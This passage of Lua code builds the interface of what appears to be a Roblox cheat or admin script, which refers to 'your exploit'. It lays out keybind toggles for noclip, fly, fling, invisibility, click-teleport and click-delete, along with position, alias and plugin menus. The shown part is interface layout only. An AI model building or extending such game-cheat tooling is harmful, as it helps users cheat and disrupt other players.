Select_3.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_3.BorderSizePixel = 0
Select_3.Position = UDim2.new(0, 152, 0, 0)
Select_3.Size = UDim2.new(0, 40, 0, 20)
Select_3.Font = Enum.Font.SourceSans
Select_3.TextSize = 14
Select_3.Text = "Add"
Select_3.TextColor3 = Color3.new(0, 0, 0)
Select_3.ZIndex = 10
table.insert(shade3,Select_3)
table.insert(text2,Select_3)

Noclip.Name = "Noclip"
Noclip.Parent = Toggles
Noclip.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Noclip.BorderSizePixel = 0
Noclip.Position = UDim2.new(0, 0, 0, 25)
Noclip.Size = UDim2.new(0, 192, 0, 20)
Noclip.Font = Enum.Font.SourceSans
Noclip.TextSize = 14
Noclip.Text = "    Toggle Noclip"
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextXAlignment = Enum.TextXAlignment.Left
Noclip.ZIndex = 10
table.insert(shade2,Noclip)
table.insert(text1,Noclip)

Select_4.Name = "Select"
Select_4.Parent = Noclip
Select_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_4.BorderSizePixel = 0
Select_4.Position = UDim2.new(0, 152, 0, 0)
Select_4.Size = UDim2.new(0, 40, 0, 20)
Select_4.Font = Enum.Font.SourceSans
Select_4.TextSize = 14
Select_4.Text = "Add"
Select_4.TextColor3 = Color3.new(0, 0, 0)
Select_4.ZIndex = 10
table.insert(shade3,Select_4)
table.insert(text2,Select_4)

Float.Name = "Float"
Float.Parent = Toggles
Float.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Float.BorderSizePixel = 0
Float.Position = UDim2.new(0, 0, 0, 50)
Float.Size = UDim2.new(0, 192, 0, 20)
Float.Font = Enum.Font.SourceSans
Float.TextSize = 14
Float.Text = "    Toggle Float"
Float.TextColor3 = Color3.new(1, 1, 1)
Float.TextXAlignment = Enum.TextXAlignment.Left
Float.ZIndex = 10
table.insert(shade2,Float)
table.insert(text1,Float)

Select_5.Name = "Select"
Select_5.Parent = Float
Select_5.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_5.BorderSizePixel = 0
Select_5.Position = UDim2.new(0, 152, 0, 0)
Select_5.Size = UDim2.new(0, 40, 0, 20)
Select_5.Font = Enum.Font.SourceSans
Select_5.TextSize = 14
Select_5.Text = "Add"
Select_5.TextColor3 = Color3.new(0, 0, 0)
Select_5.ZIndex = 10
table.insert(shade3,Select_5)
table.insert(text2,Select_5)

ClickTP.Name = "Click TP"
ClickTP.Parent = Toggles
ClickTP.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
ClickTP.BorderSizePixel = 0
ClickTP.Position = UDim2.new(0, 0, 0, 75)
ClickTP.Size = UDim2.new(0, 192, 0, 20)
ClickTP.Font = Enum.Font.SourceSans
ClickTP.TextSize = 14
ClickTP.Text = "    Click TP (Hold Key & Click)"
ClickTP.TextColor3 = Color3.new(1, 1, 1)
ClickTP.TextXAlignment = Enum.TextXAlignment.Left
ClickTP.ZIndex = 10
table.insert(shade2,ClickTP)
table.insert(text1,ClickTP)

Select_6.Name = "Select"
Select_6.Parent = ClickTP
Select_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_6.BorderSizePixel = 0
Select_6.Position = UDim2.new(0, 152, 0, 0)
Select_6.Size = UDim2.new(0, 40, 0, 20)
Select_6.Font = Enum.Font.SourceSans
Select_6.TextSize = 14
Select_6.Text = "Add"
Select_6.TextColor3 = Color3.new(0, 0, 0)
Select_6.ZIndex = 10
table.insert(shade3,Select_6)
table.insert(text2,Select_6)

ClickDelete.Name = "Click Delete"
ClickDelete.Parent = Toggles
ClickDelete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
ClickDelete.BorderSizePixel = 0
ClickDelete.Position = UDim2.new(0, 0, 0, 100)
ClickDelete.Size = UDim2.new(0, 192, 0, 20)
ClickDelete.Font = Enum.Font.SourceSans
ClickDelete.TextSize = 14
ClickDelete.Text = "    Click Delete (Hold Key & Click)"
ClickDelete.TextColor3 = Color3.new(1, 1, 1)
ClickDelete.TextXAlignment = Enum.TextXAlignment.Left
ClickDelete.ZIndex = 10
table.insert(shade2,ClickDelete)
table.insert(text1,ClickDelete)

Select_13.Name = "Select"
Select_13.Parent = ClickDelete
Select_13.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_13.BorderSizePixel = 0
Select_13.Position = UDim2.new(0, 152, 0, 0)
Select_13.Size = UDim2.new(0, 40, 0, 20)
Select_13.Font = Enum.Font.SourceSans
Select_13.TextSize = 14
Select_13.Text = "Add"
Select_13.TextColor3 = Color3.new(0, 0, 0)
Select_13.ZIndex = 10
table.insert(shade3,Select_13)
table.insert(text2,Select_13) 

Xray.Name = "Xray"
Xray.Parent = Toggles
Xray.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Xray.BorderSizePixel = 0
Xray.Position = UDim2.new(0, 0, 0, 125)
Xray.Size = UDim2.new(0, 192, 0, 20)
Xray.Font = Enum.Font.SourceSans
Xray.TextSize = 14
Xray.Text = "    Toggle Xray"
Xray.TextColor3 = Color3.new(1, 1, 1)
Xray.TextXAlignment = Enum.TextXAlignment.Left
Xray.ZIndex = 10
table.insert(shade2,Xray)
table.insert(text1,Xray)

Select_10.Name = "Select"
Select_10.Parent = Xray
Select_10.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_10.BorderSizePixel = 0
Select_10.Position = UDim2.new(0, 152, 0, 0)
Select_10.Size = UDim2.new(0, 40, 0, 20)
Select_10.Font = Enum.Font.SourceSans
Select_10.TextSize = 14
Select_10.Text = "Add"
Select_10.TextColor3 = Color3.new(0, 0, 0)
Select_10.ZIndex = 10
table.insert(shade3,Select_10)
table.insert(text2,Select_10)

Swim.Name = "Swim"
Swim.Parent = Toggles
Swim.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Swim.BorderSizePixel = 0
Swim.Position = UDim2.new(0, 0, 0, 150)
Swim.Size = UDim2.new(0, 192, 0, 20)
Swim.Font = Enum.Font.SourceSans
Swim.TextSize = 14
Swim.Text = "    Toggle Swim"
Swim.TextColor3 = Color3.new(1, 1, 1)
Swim.TextXAlignment = Enum.TextXAlignment.Left
Swim.ZIndex = 10
table.insert(shade2,Swim)
table.insert(text1,Swim)

Select_11.Name = "Select"
Select_11.Parent = Swim
Select_11.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_11.BorderSizePixel = 0
Select_11.Position = UDim2.new(0, 152, 0, 0)
Select_11.Size = UDim2.new(0, 40, 0, 20)
Select_11.Font = Enum.Font.SourceSans
Select_11.TextSize = 14
Select_11.Text = "Add"
Select_11.TextColor3 = Color3.new(0, 0, 0)
Select_11.ZIndex = 10
table.insert(shade3,Select_11)
table.insert(text2,Select_11)

Fling.Name = "Fling"
Fling.Parent = Toggles
Fling.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Fling.BorderSizePixel = 0
Fling.Position = UDim2.new(0, 0, 0, 175)
Fling.Size = UDim2.new(0, 192, 0, 20)
Fling.Font = Enum.Font.SourceSans
Fling.TextSize = 14
Fling.Text = "    Toggle Fling"
Fling.TextColor3 = Color3.new(1, 1, 1)
Fling.TextXAlignment = Enum.TextXAlignment.Left
Fling.ZIndex = 10
table.insert(shade2,Fling)
table.insert(text1,Fling)

Select_12.Name = "Select"
Select_12.Parent = Fling
Select_12.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_12.BorderSizePixel = 0
Select_12.Position = UDim2.new(0, 152, 0, 0)
Select_12.Size = UDim2.new(0, 40, 0, 20)
Select_12.Font = Enum.Font.SourceSans
Select_12.TextSize = 14
Select_12.Text = "Add"
Select_12.TextColor3 = Color3.new(0, 0, 0)
Select_12.ZIndex = 10
table.insert(shade3,Select_12)
table.insert(text2,Select_12)

Invisible.Name = "Invisible"
Invisible.Parent = Toggles
Invisible.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Invisible.BorderSizePixel = 0
Invisible.Position = UDim2.new(0, 0, 0, 200)
Invisible.Size = UDim2.new(0, 192, 0, 20)
Invisible.Font = Enum.Font.SourceSans
Invisible.TextSize = 14
Invisible.Text = "    Toggle Invisible"
Invisible.TextColor3 = Color3.new(1, 1, 1)
Invisible.TextXAlignment = Enum.TextXAlignment.Left
Invisible.ZIndex = 10
table.insert(shade2,Invisible)
table.insert(text1,Invisible)

Select_14.Name = "Select"
Select_14.Parent = Invisible
Select_14.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_14.BorderSizePixel = 0
Select_14.Position = UDim2.new(0, 152, 0, 0)
Select_14.Size = UDim2.new(0, 40, 0, 20)
Select_14.Font = Enum.Font.SourceSans
Select_14.TextSize = 14
Select_14.Text = "Add"
Select_14.TextColor3 = Color3.new(0, 0, 0)
Select_14.ZIndex = 10
table.insert(shade3,Select_14)
table.insert(text2,Select_14)

Vehiclefly.Name = "VehicleFly"
Vehiclefly.Parent = Toggles
Vehiclefly.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Vehiclefly.BorderSizePixel = 0
Vehiclefly.Position = UDim2.new(0, 0, 0, 225)
Vehiclefly.Size = UDim2.new(0, 192, 0, 20)
Vehiclefly.Font = Enum.Font.SourceSans
Vehiclefly.TextSize = 14
Vehiclefly.Text = "    Toggle VehicleFly"
Vehiclefly.TextColor3 = Color3.new(1, 1, 1)
Vehiclefly.TextXAlignment = Enum.TextXAlignment.Left
Vehiclefly.ZIndex = 10
table.insert(shade2,Vehiclefly)
table.insert(text1,Vehiclefly)

Select_15.Name = "Select"
Select_15.Parent = Vehiclefly
Select_15.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_15.BorderSizePixel = 0
Select_15.Position = UDim2.new(0, 152, 0, 0)
Select_15.Size = UDim2.new(0, 40, 0, 20)
Select_15.Font = Enum.Font.SourceSans
Select_15.TextSize = 14
Select_15.Text = "Add"
Select_15.TextColor3 = Color3.new(0, 0, 0)
Select_15.ZIndex = 10
table.insert(shade3,Select_15)
table.insert(text2,Select_15)

VehicleNoclip.Name = "VehicleNoclip"
VehicleNoclip.Parent = Toggles
VehicleNoclip.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
VehicleNoclip.BorderSizePixel = 0
VehicleNoclip.Position = UDim2.new(0, 0, 0, 250)
VehicleNoclip.Size = UDim2.new(0, 192, 0, 20)
VehicleNoclip.Font = Enum.Font.SourceSans
VehicleNoclip.TextSize = 14
VehicleNoclip.Text = "    Toggle VehicleNoclip"
VehicleNoclip.TextColor3 = Color3.new(1, 1, 1)
VehicleNoclip.TextXAlignment = Enum.TextXAlignment.Left
VehicleNoclip.ZIndex = 10
table.insert(shade2,VehicleNoclip)
table.insert(text1,VehicleNoclip)

Select_16.Name = "Select"
Select_16.Parent = VehicleNoclip
Select_16.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Select_16.BorderSizePixel = 0
Select_16.Position = UDim2.new(0, 152, 0, 0)
Select_16.Size = UDim2.new(0, 40, 0, 20)
Select_16.Font = Enum.Font.SourceSans
Select_16.TextSize = 14
Select_16.Text = "Add"
Select_16.TextColor3 = Color3.new(0, 0, 0)
Select_16.ZIndex = 10
table.insert(shade3,Select_16)
table.insert(text2,Select_16)

shadow_2.Name = "shadow"
shadow_2.Parent = KeybindEditor
shadow_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
shadow_2.BorderSizePixel = 0
shadow_2.Size = UDim2.new(0, 360, 0, 20)
shadow_2.ZIndex = 10
table.insert(shade2,shadow_2)

PopupText_2.Name = "PopupText"
PopupText_2.Parent = shadow_2
PopupText_2.BackgroundTransparency = 1
PopupText_2.Size = UDim2.new(1, 0, 0.95, 0)
PopupText_2.ZIndex = 10
PopupText_2.Font = Enum.Font.SourceSans
PopupText_2.TextSize = 14
PopupText_2.Text = "Set Keybinds"
PopupText_2.TextColor3 = Color3.new(1, 1, 1)
PopupText_2.TextWrapped = true
table.insert(text1,PopupText_2)

Exit_2.Name = "Exit"
Exit_2.Parent = shadow_2
Exit_2.BackgroundTransparency = 1
Exit_2.Position = UDim2.new(1, -20, 0, 0)
Exit_2.Size = UDim2.new(0, 20, 0, 20)
Exit_2.Text = ""
Exit_2.ZIndex = 10

ExitImage_2.Parent = Exit_2
ExitImage_2.BackgroundColor3 = Color3.new(1, 1, 1)
ExitImage_2.BackgroundTransparency = 1
ExitImage_2.Position = UDim2.new(0, 5, 0, 5)
ExitImage_2.Size = UDim2.new(0, 10, 0, 10)
ExitImage_2.Image = "rbxassetid://5054663650"
ExitImage_2.ZIndex = 10

PositionsFrame.Name = "PositionsFrame"
PositionsFrame.Parent = Settings
PositionsFrame.Active = true
PositionsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
PositionsFrame.BorderSizePixel = 0
PositionsFrame.Size = UDim2.new(0, 250, 0, 175)
PositionsFrame.Position = UDim2.new(0, 0, 0, 175)
PositionsFrame.ZIndex = 10
table.insert(shade1,PositionsFrame)

Close_3.Name = "Close"
Close_3.Parent = PositionsFrame
Close_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Close_3.BorderSizePixel = 0
Close_3.Position = UDim2.new(0, 205, 0, 150)
Close_3.Size = UDim2.new(0, 40, 0, 20)
Close_3.Font = Enum.Font.SourceSans
Close_3.TextSize = 14
Close_3.Text = "Close"
Close_3.TextColor3 = Color3.new(1, 1, 1)
Close_3.ZIndex = 10
table.insert(shade2,Close_3)
table.insert(text1,Close_3)

Delete_5.Name = "Delete"
Delete_5.Parent = PositionsFrame
Delete_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Delete_5.BorderSizePixel = 0
Delete_5.Position = UDim2.new(0, 50, 0, 150)
Delete_5.Size = UDim2.new(0, 40, 0, 20)
Delete_5.Font = Enum.Font.SourceSans
Delete_5.TextSize = 14
Delete_5.Text = "Clear"
Delete_5.TextColor3 = Color3.new(1, 1, 1)
Delete_5.ZIndex = 10
table.insert(shade2,Delete_5)
table.insert(text1,Delete_5)

Part.Name = "PartGoto"
Part.Parent = PositionsFrame
Part.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Part.BorderSizePixel = 0
Part.Position = UDim2.new(0, 5, 0, 150)
Part.Size = UDim2.new(0, 40, 0, 20)
Part.Font = Enum.Font.SourceSans
Part.TextSize = 14
Part.Text = "Part"
Part.TextColor3 = Color3.new(1, 1, 1)
Part.ZIndex = 10
table.insert(shade2,Part)
table.insert(text1,Part)

Holder_4.Name = "Holder"
Holder_4.Parent = PositionsFrame
Holder_4.BackgroundTransparency = 1
Holder_4.BorderSizePixel = 0
Holder_4.Position = UDim2.new(0, 0, 0, 0)
Holder_4.Selectable = false
Holder_4.Size = UDim2.new(0, 250, 0, 145)
Holder_4.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
Holder_4.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_4.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_4.ScrollBarThickness = 0
Holder_4.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_4.VerticalScrollBarInset = 'Always'
Holder_4.ZIndex = 10

Example_4.Name = "Example"
Example_4.Parent = PositionsFrame
Example_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Example_4.BorderSizePixel = 0
Example_4.Size = UDim2.new(0, 10, 0, 20)
Example_4.Visible = false
Example_4.Position = UDim2.new(0, 0, 0, -5)
Example_4.ZIndex = 10
table.insert(shade2,Example_4)

Text_5.Name = "Text"
Text_5.Parent = Example_4
Text_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Text_5.BorderSizePixel = 0
Text_5.Position = UDim2.new(0, 10, 0, 0)
Text_5.Size = UDim2.new(0, 240, 0, 20)
Text_5.Font = Enum.Font.SourceSans
Text_5.TextSize = 14
Text_5.Text = "Position"
Text_5.TextColor3 = Color3.new(1, 1, 1)
Text_5.TextXAlignment = Enum.TextXAlignment.Left
Text_5.ZIndex = 10
table.insert(shade2,Text_5)
table.insert(text1,Text_5)

Delete_6.Name = "Delete"
Delete_6.Parent = Text_5
Delete_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Delete_6.BorderSizePixel = 0
Delete_6.Position = UDim2.new(0, 200, 0, 0)
Delete_6.Size = UDim2.new(0, 40, 0, 20)
Delete_6.Font = Enum.Font.SourceSans
Delete_6.TextSize = 14
Delete_6.Text = "Delete"
Delete_6.TextColor3 = Color3.new(0, 0, 0)
Delete_6.ZIndex = 10
table.insert(shade3,Delete_6)
table.insert(text2,Delete_6)

TP.Name = "TP"
TP.Parent = Text_5
TP.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
TP.BorderSizePixel = 0
TP.Position = UDim2.new(0, 155, 0, 0)
TP.Size = UDim2.new(0, 40, 0, 20)
TP.Font = Enum.Font.SourceSans
TP.TextSize = 14
TP.Text = "Goto"
TP.TextColor3 = Color3.new(0, 0, 0)
TP.ZIndex = 10
table.insert(shade3,TP)
table.insert(text2,TP)

AliasesFrame.Name = "AliasesFrame"
AliasesFrame.Parent = Settings
AliasesFrame.Active = true
AliasesFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
AliasesFrame.BorderSizePixel = 0
AliasesFrame.Position = UDim2.new(0, 0, 0, 175)
AliasesFrame.Size = UDim2.new(0, 250, 0, 175)
AliasesFrame.ZIndex = 10
table.insert(shade1,AliasesFrame)

Close_2.Name = "Close"
Close_2.Parent = AliasesFrame
Close_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Close_2.BorderSizePixel = 0
Close_2.Position = UDim2.new(0, 205, 0, 150)
Close_2.Size = UDim2.new(0, 40, 0, 20)
Close_2.Font = Enum.Font.SourceSans
Close_2.TextSize = 14
Close_2.Text = "Close"
Close_2.TextColor3 = Color3.new(1, 1, 1)
Close_2.ZIndex = 10
table.insert(shade2,Close_2)
table.insert(text1,Close_2)

Delete_3.Name = "Delete"
Delete_3.Parent = AliasesFrame
Delete_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Delete_3.BorderSizePixel = 0
Delete_3.Position = UDim2.new(0, 5, 0, 150)
Delete_3.Size = UDim2.new(0, 40, 0, 20)
Delete_3.Font = Enum.Font.SourceSans
Delete_3.TextSize = 14
Delete_3.Text = "Clear"
Delete_3.TextColor3 = Color3.new(1, 1, 1)
Delete_3.ZIndex = 10
table.insert(shade2,Delete_3)
table.insert(text1,Delete_3)

Holder_3.Name = "Holder"
Holder_3.Parent = AliasesFrame
Holder_3.BackgroundTransparency = 1
Holder_3.BorderSizePixel = 0
Holder_3.Position = UDim2.new(0, 0, 0, 0)
Holder_3.Size = UDim2.new(0, 250, 0, 145)
Holder_3.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
Holder_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_3.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_3.ScrollBarThickness = 0
Holder_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_3.VerticalScrollBarInset = 'Always'
Holder_3.ZIndex = 10

Example_3.Name = "Example"
Example_3.Parent = AliasesFrame
Example_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Example_3.BorderSizePixel = 0
Example_3.Size = UDim2.new(0, 10, 0, 20)
Example_3.Visible = false
Example_3.ZIndex = 10
table.insert(shade2,Example_3)

Text_4.Name = "Text"
Text_4.Parent = Example_3
Text_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Text_4.BorderSizePixel = 0
Text_4.Position = UDim2.new(0, 10, 0, 0)
Text_4.Size = UDim2.new(0, 240, 0, 20)
Text_4.Font = Enum.Font.SourceSans
Text_4.TextSize = 14
Text_4.Text = "honk"
Text_4.TextColor3 = Color3.new(1, 1, 1)
Text_4.TextXAlignment = Enum.TextXAlignment.Left
Text_4.ZIndex = 10
table.insert(shade2,Text_4)
table.insert(text1,Text_4)

Delete_4.Name = "Delete"
Delete_4.Parent = Text_4
Delete_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Delete_4.BorderSizePixel = 0
Delete_4.Position = UDim2.new(0, 200, 0, 0)
Delete_4.Size = UDim2.new(0, 40, 0, 20)
Delete_4.Font = Enum.Font.SourceSans
Delete_4.TextSize = 14
Delete_4.Text = "Delete"
Delete_4.TextColor3 = Color3.new(0, 0, 0)
Delete_4.ZIndex = 10
table.insert(shade3,Delete_4)
table.insert(text2,Delete_4)

PluginsFrame.Name = "PluginsFrame"
PluginsFrame.Parent = Settings
PluginsFrame.Active = true
PluginsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
PluginsFrame.BorderSizePixel = 0
PluginsFrame.Position = UDim2.new(0, 0, 0, 175)
PluginsFrame.Size = UDim2.new(0, 250, 0, 175)
PluginsFrame.ZIndex = 10
table.insert(shade1,PluginsFrame)

Close_4.Name = "Close"
Close_4.Parent = PluginsFrame
Close_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Close_4.BorderSizePixel = 0
Close_4.Position = UDim2.new(0, 205, 0, 150)
Close_4.Size = UDim2.new(0, 40, 0, 20)
Close_4.Font = Enum.Font.SourceSans
Close_4.TextSize = 14
Close_4.Text = "Close"
Close_4.TextColor3 = Color3.new(1, 1, 1)
Close_4.ZIndex = 10
table.insert(shade2,Close_4)
table.insert(text1,Close_4)

Add_3.Name = "Add"
Add_3.Parent = PluginsFrame
Add_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Add_3.BorderSizePixel = 0
Add_3.Position = UDim2.new(0, 5, 0, 150)
Add_3.Size = UDim2.new(0, 40, 0, 20)
Add_3.Font = Enum.Font.SourceSans
Add_3.TextSize = 14
Add_3.Text = "Add"
Add_3.TextColor3 = Color3.new(1, 1, 1)
Add_3.ZIndex = 10
table.insert(shade2,Add_3)
table.insert(text1,Add_3)

Holder_5.Name = "Holder"
Holder_5.Parent = PluginsFrame
Holder_5.BackgroundTransparency = 1
Holder_5.BorderSizePixel = 0
Holder_5.Position = UDim2.new(0, 0, 0, 0)
Holder_5.Selectable = false
Holder_5.Size = UDim2.new(0, 250, 0, 145)
Holder_5.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
Holder_5.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_5.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_5.ScrollBarThickness = 0
Holder_5.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_5.VerticalScrollBarInset = 'Always'
Holder_5.ZIndex = 10

Example_5.Name = "Example"
Example_5.Parent = PluginsFrame
Example_5.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Example_5.BorderSizePixel = 0
Example_5.Size = UDim2.new(0, 10, 0, 20)
Example_5.Visible = false
Example_5.ZIndex = 10
table.insert(shade2,Example_5)

Text_6.Name = "Text"
Text_6.Parent = Example_5
Text_6.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Text_6.BorderSizePixel = 0
Text_6.Position = UDim2.new(0, 10, 0, 0)
Text_6.Size = UDim2.new(0, 240, 0, 20)
Text_6.Font = Enum.Font.SourceSans
Text_6.TextSize = 14
Text_6.Text = "F4 > Toggle Fly"
Text_6.TextColor3 = Color3.new(1, 1, 1)
Text_6.TextXAlignment = Enum.TextXAlignment.Left
Text_6.ZIndex = 10
table.insert(shade2,Text_6)
table.insert(text1,Text_6)

Delete_7.Name = "Delete"
Delete_7.Parent = Text_6
Delete_7.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Delete_7.BorderSizePixel = 0
Delete_7.Position = UDim2.new(0, 200, 0, 0)
Delete_7.Size = UDim2.new(0, 40, 0, 20)
Delete_7.Font = Enum.Font.SourceSans
Delete_7.TextSize = 14
Delete_7.Text = "Delete"
Delete_7.TextColor3 = Color3.new(0, 0, 0)
Delete_7.ZIndex = 10
table.insert(shade3,Delete_7)
table.insert(text2,Delete_7)

PluginEditor.Name = randomString()
PluginEditor.Parent = PARENT
PluginEditor.BorderSizePixel = 0
PluginEditor.Active = true
PluginEditor.BackgroundTransparency = 1
PluginEditor.Position = UDim2.new(0.5, -180, 0, -500)
PluginEditor.Size = UDim2.new(0, 360, 0, 20)
PluginEditor.ZIndex = 10

background_3.Name = "background"
background_3.Parent = PluginEditor
background_3.Active = true
background_3.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
background_3.BorderSizePixel = 0
background_3.Position = UDim2.new(0, 0, 0, 20)
background_3.Size = UDim2.new(0, 360, 0, 160)
background_3.ZIndex = 10
table.insert(shade1,background_3)

Dark_9.Name = "Dark"
Dark_9.Parent = background_3
Dark_9.Active = true
Dark_9.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Dark_9.BorderSizePixel = 0
Dark_9.Position = UDim2.new(0, 222, 0, 0)
Dark_9.Size = UDim2.new(0, 2, 0, 160)
Dark_9.ZIndex = 10
table.insert(shade2,Dark_9)

Img.Name = "Img"
Img.Parent = background_3
Img.BackgroundTransparency = 1
Img.Position = UDim2.new(0, 242, 0, 3)
Img.Size = UDim2.new(0, 100, 0, 95)
Img.Image = "rbxassetid://4113050383"
Img.ZIndex = 10

AddPlugin.Name = "AddPlugin"
AddPlugin.Parent = background_3
AddPlugin.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
AddPlugin.BorderSizePixel = 0
AddPlugin.Position = UDim2.new(0, 235, 0, 100)
AddPlugin.Size = UDim2.new(0, 115, 0, 50)
AddPlugin.Font = Enum.Font.SourceSans
AddPlugin.TextSize = 14
AddPlugin.Text = "Add Plugin"
AddPlugin.TextColor3 = Color3.new(1, 1, 1)
AddPlugin.ZIndex = 10
table.insert(shade2,AddPlugin)
table.insert(text1,AddPlugin)

FileName.Name = "FileName"
FileName.Parent = background_3
FileName.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
FileName.BorderSizePixel = 0
FileName.Position = UDim2.new(0.028, 0, 0.625, 0)
FileName.Size = UDim2.new(0, 200, 0, 50)
FileName.Font = Enum.Font.SourceSans
FileName.TextSize = 14
FileName.Text = "Plugin File Name"
FileName.TextColor3 = Color3.new(1, 1, 1)
FileName.ZIndex = 10
table.insert(shade2,FileName)
table.insert(text1,FileName)

About.Name = "About"
About.Parent = background_3
About.BackgroundTransparency = 1
About.BorderSizePixel = 0
About.Position = UDim2.new(0, 17, 0, 10)
About.Size = UDim2.new(0, 187, 0, 49)
About.Font = Enum.Font.SourceSans
About.TextSize = 14
About.Text = "Plugins are .iy files and should be located in the 'workspace' folder of your exploit."
About.TextColor3 = Color3.fromRGB(255, 255, 255)
About.TextWrapped = true
About.TextYAlignment = Enum.TextYAlignment.Top
About.ZIndex = 10
table.insert(text1,About)

Directions_2.Name = "Directions"
Directions_2.Parent = background_3
Directions_2.BackgroundTransparency = 1
Directions_2.BorderSizePixel = 0
Directions_2.Position = UDim2.new(0, 17, 0, 60)
Directions_2.Size = UDim2.new(0, 187, 0, 49)
Directions_2.Font = Enum.Font.SourceSans
Directions_2.TextSize = 14
Directions_2.Text = "Type the name of the plugin file you want to add below."
Directions_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Directions_2.TextWrapped = true
Directions_2.TextYAlignment = Enum.TextYAlignment.Top
Directions_2.ZIndex = 10
table.insert(text1,Directions_2)

shadow_3.Name = "shadow"
shadow_3.Parent = PluginEditor
shadow_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
shadow_3.BorderSizePixel = 0
shadow_3.Size = UDim2.new(0, 360, 0, 20)
shadow_3.ZIndex = 10
table.insert(shade2,shadow_3)

PopupText_3.Name = "PopupText"
PopupText_3.Parent = shadow_3
PopupText_3.BackgroundTransparency = 1
PopupText_3.Size = UDim2.new(1, 0, 0.95, 0)
PopupText_3.ZIndex = 10
PopupText_3.Font = Enum.Font.SourceSans
PopupText_3.TextSize = 14
PopupText_3.Text = "Add Plugins"
PopupText_3.TextColor3 = Color3.new(1, 1, 1)
PopupText_3.TextWrapped = true
table.insert(text1,PopupText_3)

Exit_3.Name = "Exit"
Exit_3.Parent = shadow_3
Exit_3.BackgroundTransparency = 1
Exit_3.Position = UDim2.new(1, -20, 0, 0)
Exit_3.Size = UDim2.new(0, 20, 0, 20)
Exit_3.Text = ""
Exit_3.ZIndex = 10

ExitImage_3.Parent = Exit_3
ExitImage_3.BackgroundColor3 = Color3.new(1, 1, 1)
ExitImage_3.BackgroundTransparency = 1
ExitImage_3.Position = UDim2.new(0, 5, 0, 5)
ExitImage_3.Size = UDim2.new(0, 10, 0, 10)
ExitImage_3.Image = "rbxassetid://5054663650"
ExitImage_3.ZIndex = 10

AliasHint.Name = "AliasHint"
AliasHint.Parent = AliasesFrame
AliasHint.BackgroundTransparency = 1
AliasHint.BorderSizePixel = 0
AliasHint.Position = UDim2.new(0, 25, 0, 40)
AliasHint.Size = UDim2.new(0, 200, 0, 50)
AliasHint.Font = Enum.Font.SourceSansItalic
AliasHint.TextSize = 16
AliasHint.Text = "Add aliases by using the 'addalias' command"
AliasHint.TextColor3 = Color3.new(1, 1, 1)
AliasHint.TextStrokeColor3 = Color3.new(1, 1, 1)
AliasHint.TextWrapped = true
AliasHint.ZIndex = 10
table.insert(text1,AliasHint)

PluginsHint.Name = "PluginsHint"
PluginsHint.Parent = PluginsFrame
PluginsHint.BackgroundTransparency = 1
PluginsHint.BorderSizePixel = 0
PluginsHint.Position = UDim2.new(0, 25, 0, 40)
PluginsHint.Size = UDim2.new(0, 200, 0, 50)
PluginsHint.Font = Enum.Font.SourceSansItalic
